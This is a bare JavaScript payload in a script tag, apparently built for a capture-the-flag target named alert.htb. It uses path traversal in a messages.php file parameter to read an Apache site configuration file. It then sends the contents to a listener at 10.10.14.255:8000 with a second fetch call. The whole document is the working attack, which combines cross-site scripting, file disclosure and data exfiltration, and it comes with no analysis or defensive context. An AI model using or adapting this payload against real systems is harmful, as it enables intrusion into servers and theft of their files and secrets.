<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../etc/apache2/sites-enabled/000-default.conf")
    .then(response => response.text())
    .then(data => {
        fetch("http://10.10.14.255:8000/?info=" + encodeURIComponent(data));
})
.catch(err => console.error("Error:", err));
</script>

